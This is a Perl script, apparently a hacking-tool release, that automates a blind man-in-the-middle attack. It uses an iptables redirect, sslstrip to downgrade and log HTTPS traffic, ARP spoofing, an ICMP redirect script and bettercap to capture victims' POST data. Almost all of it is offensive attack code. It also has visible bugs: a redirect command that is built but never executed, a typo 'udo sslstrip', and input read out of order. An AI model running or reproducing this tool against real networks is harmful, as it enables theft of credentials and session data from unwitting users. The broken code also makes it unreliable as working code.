# *************************************************************************************** #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#                     Agreement between "Haroon Awan" and "You"(user).                    #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#  1. By using this piece of software your bound to these point.                          #
#  2. This an End User License Agreement (EULA) is a legal between a software application #
#     author "Haroon Awan" and (YOU) user of this software.                               #
#  3. This software application grants users rights to use for any purpose or modify and  #
#     redistribute creative works.                                                        #
#  4. This software comes in "is-as" warranty, author "Haroon Awan" take no responsbility #
#     what you do with by/this software as your free to use this software.                #
#  5. Any other purpose(s) that it suites as long as it is not related to any kind of     #
#     crime or using it in un-authorized environment.                                     #
#  6. You can use this software to protect and secure your data information in any        #
#     environment.                                                                        #
#  7. It can also be used in state of being protection against the unauthorized use of    #
#     information.                                                                        #
#  8. It can be used to take measures achieve protection.                                 #
# *************************************************************************************** #

#! /usr/bin/perl -w

use strict;
use warnings;
use Term::ANSIColor;

system "clear";
print color('bold white');
print qq / 

	  	       .,ad88888ba,.
 		    .,ad8888888888888a,
	       	    d8P'"'98888P''"98888b,   HACKING IS AN ILLUSION!
       		    9b    d8888,    `9888B
                  ,d88aaa8888888b,,,d888P'
       	  	 d8888888888888888888888b
       	   	d888888P8898888888888888P    	Coded By: Haroon Awan
       		88888PP    9888888888888
      	 	998PP       9888888888P'
       		            339888P333
       	        	        '3"
/;

print color('bold red'),"\n[ ~ ] Automatic HTTPS Network Injection for Blind MITM [ ~ ]\n";
print color('bold blue'),"\n[ + ] Setting up environment\n\n";
print color('reset');
print color('bold green');

my $tables;
print "[ + ] You will have to uncomment iptables redirect.\n";
print "[ + ] Inside nano use ctrl+o to save your changes ctrl+x to exit and continue the script.\n";
print "[ + ] Would you like to open /etc/etter.conf to uncomment iptables redirect? (y/n): ";
$tables=<STDIN>;
chomp($tables);
    if ($tables eq "y"){
        print "press ctrl+x to exit nano";
        system ("sudo nano /etc/etter.conf");
    }

# change iptables to allow redirection from port 80 to port 8080
my $redirect;
print "[ + ] Changing iptables to redirect traffic from port 80 to port 8080\n";
$redirect='sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080';

# check to make sure ip forwarding is enabled
my $forward;
print "[ + ] Checking to make sure ip forwarding is enabled\n";
system ("cat /proc/sys/net/ipv4/ip_forward");
print "[ + ] Does ip forward = 0? (y/n): ";
$forward=<STDIN>;
chomp($forward);
    if ($forward eq "y"){
        system ("sudo nano /proc/sys/net/ipv4/ip_forward");
        system ("cat /proc/sys/net/ipv4/ip_forward");
}


# check to find out what the default gateway is
my $default;
system ("netstat -nr");
    print "[ + ] What is the default gateway: ";
    $default=<STDIN>;
    chomp($default);

# check which network interface device
my $interface;
system ("ifconfig");
    print "[ + ] Which network interface would you like to use: ";
    $interface=<STDIN>;
    chomp($interface);

# check what your ip address is
my $ip;
system ("ifconfig $interface");
    print "[ + ] What is your IP address: ";
    $ip=<STDIN>;
    chomp($ip);


# start ssl strip
my $ssl;
my $log;
print "[ + ] Starting SSL Strip.\n";
print "[ + ] We have a few options for our parameters with SSL Strip.\n";
print "[ ~ ] Here are you options [ ~ ]  \n[ + ] Sniff all traffic and kill active sessions with log data (akl) \n[ + ] Kill, log and sniff only https traffic (kl) \n[ + ] Log https traffic only(l)\n";
    $ssl=<STDIN>;
    chomp($ssl);
print "Enter name of file end with .log\n";
    $log=<STDIN>;
    chomp($log);

# parameters 
#-w <filename>, --write=<filename> Specify file to log to (optional).
#-p , --post                       Log only SSL POSTs. (default)
#-s , --ssl                        Log all SSL traffic to and from server.
#-a , --all                        Log all SSL and HTTP traffic to and from server.
#-l <port>, --listen=<port>        Port to listen on (default 10000).
#-f , --favicon                    Substitute a lock favicon on secure requests.
#-k , --killsessions               Kill sessions in progress.

        if ($ssl eq "akl"){
            system ("sudo sslstrip -a -k -l 8080 -w $log ");
        }
        if ($ssl eq "kl"){
            system ("sudo sslstrip -k -l 8080 -w $log ");
        }
        elsif ($ssl eq "l"){
            system ("udo sslstrip -l 8080 -w $log ");
        }

# start following the sslstrip log using tail
my $tail;
print "[ + ] Do you want to start to follow the log file in real time? (y/n): ";
    $tail=<STDIN>;
    chomp($tail);    
    if ($tail eq "y"){
        print "[ + ] Starting to tail the sslstrip log file.\n";
        system ("sudo tail -f $log");
    }
    else {
        print "[ + ] Script done. Time to wait.\n";
    }


# choice selector for arp spoof or blinder
my $options;
my $arp;
            print "[ + ] Option 1 - Start ARP Spoof, type: arpspoof\n [ + ] Option 2 - Start Blinder, type: blinder\n";
            $options=<STDIN>;
            chomp($options);
	    $arp=<STDIN>;
    	    chomp($arp);

        if ($options eq "arpspoof") 					{
# start blind traffic hijacker
my $blindarp;
my $target;
my $gateway;
my $option;
my $localhost;
$localhost=127.0.0.1;
print "[ + ] Enter Gateway? (y/n)\n";
    $gateway=<STDIN>;
    chomp($gateway);
print "[ + ] Do you want to start a blind attack? (y/n): ";
    $blindarp=<STDIN>;
    chomp($blindarp);
        if ($blindarp eq "y")					{
            print "[ + ] Enter the IP of the Target: ";
            $target=<STDIN>;
            chomp($target);
			     					}
            print "[ + ] Option 1 - Redirect victim traffic to localhost\n [ + ] Option 2 - Redirect victim traffic to localhost and use bettercap\n [ + ] Option 3 - Hack target traffic using bettercap";
            $option=<STDIN>;
            chomp($option);
        if ($option eq "1") 					{
                system ("sudo python ICMPAttack.py -v -i $interface -g $gateway -t $target");
			    					} 
elsif($option eq "2") 						{
                system ("sudo python ICMPAttack.py -v -i $interface -g $gateway -t $target && bettercap -t $localhost --proxy -P POST"); 
		      						} 
elsif($option eq "3") 						{
                system ("sudo bettercap -t $target --proxy -P POST");
	              						}
							  }
elsif($options eq "blinder") 					{
my $target;
# start arpspoof; option to spoof a target or spoof the entire network
print "[ + ] Do you want to spoof a specific target? (y/n): ";
#    $arp=<STDIN>;
#    chomp($arp);
        if ($arp eq "y")					{
            print "[ + ] Enter the IP of the Target: \n";
            $target=<STDIN>;
            chomp($target);
                system ("xterm -e sudo arpspoof -i $interface -t $target $default");
        							}
        else 							{
            system ("xterm -e sudo arpspoof -i $interface $default");
        							}
}
print color('reset');
